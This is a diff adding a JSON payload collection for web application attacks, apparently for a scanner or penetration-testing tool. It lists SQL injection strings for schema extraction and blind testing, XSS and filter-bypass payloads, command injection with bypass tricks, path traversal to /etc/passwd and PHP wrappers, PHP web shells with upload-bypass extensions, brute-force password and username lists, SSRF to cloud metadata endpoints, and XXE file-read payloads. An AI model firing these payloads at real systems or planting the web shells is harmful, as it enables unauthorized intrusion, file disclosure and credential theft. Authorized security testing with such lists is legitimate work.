@@ -1,0 +1,208 @@
+{
+  "sqli": {
+    "detection": [
+      "'",
+      "\"",
+      "' OR '1'='1",
+      "1 AND 1=1",
+      "1 AND 1=2",
+      "' UNION SELECT NULL--",
+      "1' AND SLEEP(5)--",
+      "1; WAITFOR DELAY '0:0:5'"
+    ],
+    "extraction": [
+      "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+      "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+    ],
+    "blind_boolean": [
+      "1' AND 1=1--",
+      "1' AND 1=2--",
+      "1' AND SUBSTRING(@@version,1,1)='5'--"
+    ],
+    "blind_time": [
+      "1' AND SLEEP(5)--",
+      "1'; WAITFOR DELAY '0:0:5'--"
+    ]
+  },
+  "xss": {
+    "reflected": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "\"><script>alert(1)</script>",
+      "javascript:alert(1)",
+      "<body onload=alert(1)>"
+    ],
+    "stored": [
+      "<script>alert('stored')</script>",
+      "<img src=x onerror=alert('stored')>"
+    ],
+    "dom": [
+      "#<script>alert(1)</script>",
+      "?default=<script>alert(1)</script>"
+    ],
+    "filter_bypass": [
+      "%3Cscript%3Ealert(1)%3C/script%3E",
+      "<scr<script>ipt>alert(1)</scr</script>ipt>",
+      "<img/src=x onerror=alert(1)>",
+      "'-alert(1)-'"
+    ]
+  },
+  "command_injection": {
+    "detection": [
+      "; id",
+      "| id",
+      "& id",
+      "` id `",
+      "$(id)",
+      "; whoami",
+      "| whoami",
+      "&& whoami"
+    ],
+    "blind_time": [
+      "; sleep 5",
+      "| sleep 5",
+      "& sleep 5 &",
+      "`sleep 5`",
+      "$(sleep 5)"
+    ],
+    "filter_bypass": [
+      ";{id}",
+      "$IFS",
+      ";id${IFS}",
+      ";i\\d",
+      "|(w)hoami"
+    ]
+  },
+  "lfi": {
+    "detection": [
+      "../../../etc/passwd",
+      "....//....//....//etc/passwd",
+      "..%252f..%252f..%252fetc/passwd",
+      "/etc/passwd%00",
+      "..\\..\\..\\etc\\passwd"
+    ],
+    "php_wrappers": [
+      "php://filter/convert.base64-encode/resource=index",
+      "php://input",
+      "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
+      "expect://id"
+    ],
+    "windows": [
+      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "..\\..\\..\\windows\\win.ini"
+    ]
+  },
+  "file_upload": {
+    "extensions": [
+      ".php",
+      ".phtml",
+      ".php5",
+      ".phar",
+      ".php.jpg",
+      ".php%00.jpg",
+      ".PHP",
+      ".pHp"
+    ],
+    "content_type_bypass": [
+      "image/jpeg",
+      "image/png",
+      "image/gif"
+    ],
+    "magic_bytes": [
+      "GIF89a<?php system(cmd); ?>"
+    ],
+    "webshells": [
+      "<?php system(cmd); ?>",
+      "<?php echo shell_exec(cmd); ?>"
+    ]
+  },
+  "csrf": {
+    "detection_checks": [
+      "Check if form has anti-CSRF token",
+      "Submit form without token -- does it succeed?",
+      "Submit form with empty token -- does it succeed?",
+      "Submit form with token from different session -- does it succeed?"
+    ]
+  },
+  "brute_force": {
+    "common_passwords": [
+      "admin",
+      "password",
+      "123456",
+      "password123",
+      "admin123",
+      "root",
+      "test",
+      "guest",
+      "letmein",
+      "welcome",
+      "monkey",
+      "dragon",
+      "master",
+      "qwerty",
+      "login"
+    ],
+    "common_usernames": [
+      "admin",
+      "administrator",
+      "root",
+      "user",
+      "test",
+      "guest",
+      "info",
+      "adm",
+      "mysql",
+      "postgres"
+    ]
+  },
+  "idor": {
+    "numeric_tests": [
+      "0",
+      "1",
+      "2",
+      "-1",
+      "99999",
+      "1 OR 1=1"
+    ],
+    "string_tests": [
+      "admin",
+      "user",
+      "test",
+      "../admin"
+    ]
+  },
+  "ssrf": {
+    "internal": [
+      "http://127.0.0.1",
+      "http://localhost",
+      "http://0.0.0.0",
+      "http://[::1]",
+      "http://0x7f000001"
+    ],
+    "cloud_metadata": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://metadata.google.internal/computeMetadata/v1/"
+    ],
+    "protocol": [
+      "file:///etc/passwd",
+      "gopher://127.0.0.1:25",
+      "dict://127.0.0.1:6379/info"
+    ]
+  },
+  "session": {
+    "fixation_test": "Set known session ID before login, check if same after",
+    "predictability_test": "Collect 10 session tokens, check for patterns",
+    "cookie_flags": [
+      "HttpOnly",
+      "Secure",
+      "SameSite"
+    ]
+  },
+  "xxe": {
+    "detection": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1\">]><foo>&xxe;</foo>"
+    ]
+  }
+}
